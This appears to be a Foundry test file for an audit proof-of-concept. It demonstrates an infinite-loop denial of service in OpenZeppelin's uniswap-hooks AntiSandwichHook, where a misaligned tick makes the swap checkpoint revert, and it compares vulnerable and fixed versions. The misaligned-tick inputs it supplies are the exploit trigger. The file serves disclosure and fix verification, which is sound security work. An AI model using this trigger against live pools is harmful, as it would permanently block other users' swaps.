// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    AntiSandwichHook,
    AntiSandwichHookFixed,
    MiniToken
} from "./62524-infinite-loop-in-tick-iteration-due-to-misaligned-current-ti.sol";

// Finding 62524 — OpenZeppelin uniswap-hooks AntiSandwichHook._beforeSwap
// (verbatim tick loop @3e9fa228, L96-L105). A `currentTick` misaligned to
// `tickSpacing` makes the `tick != currentTick` walk step over the target and
// never terminate -> OOG / int24-overflow revert -> permanent swap DoS.
contract AntiSandwichHookTickDoSTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant GAS_BUDGET = 30_000_000; // full-block gas budget

    function test_exploit_misalignedTick_bricksSwapCheckpoint() public {
        Exploit e = new Exploit();
        e.run();

        // HARM: with a FULL 30M-gas block budget the verbatim loop still reverts
        // on a misaligned currentTick — the pool's top-of-block snapshot (and so
        // every swap) is permanently bricked.
        assertTrue(e.misalignedReverted(), "misaligned checkpoint must revert (swap DoS)");

        // Negative control (same buggy contract): an aligned currentTick terminates.
        assertTrue(e.alignedSucceeded(), "aligned checkpoint terminates");

        // Negative control (fixed contract, OZ PR #80): misaligned tick terminates.
        assertTrue(e.fixedHandlesMisaligned(), "fix terminates on misaligned tick");

        // Liveness harm recorded at the SINK (1 pool's swaps permanently bricked).
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), 1, "sink records 1 bricked pool");
        assertEq(e.sinkMarkerBalance(), 1, "sink marker balance");
    }

    function test_directControl_vulnRevertsButFixedTerminates_onMisalignedTick() public {
        AntiSandwichHook vuln = new AntiSandwichHook();
        AntiSandwichHookFixed fixedHook = new AntiSandwichHookFixed();

        // The verbatim-buggy loop reverts on a misaligned tick even at 30M gas...
        (bool okVulnMis,) = address(vuln).call{gas: GAS_BUDGET}(
            abi.encodeWithSelector(AntiSandwichHook.runCheckpoint.selector, int24(0), int24(5), int24(10))
        );
        assertFalse(okVulnMis, "misaligned tick bricks the buggy checkpoint");

        // ...but terminates on an aligned tick (proves misalignment is the trigger).
        (bool okVulnAligned,) = address(vuln).call{gas: GAS_BUDGET}(
            abi.encodeWithSelector(AntiSandwichHook.runCheckpoint.selector, int24(0), int24(20), int24(10))
        );
        assertTrue(okVulnAligned, "aligned tick terminates on the buggy contract");
        assertGt(vuln.iterations(), 0, "buggy aligned loop actually executed");

        // The fixed variant terminates on the SAME misaligned tick.
        (bool okFixed,) = address(fixedHook).call{gas: GAS_BUDGET}(
            abi.encodeWithSelector(AntiSandwichHookFixed.runCheckpoint.selector, int24(0), int24(5), int24(10))
        );
        assertTrue(okFixed, "fix terminates on misaligned tick");
        assertGt(fixedHook.iterations(), 0, "fixed loop actually executed");
    }
}
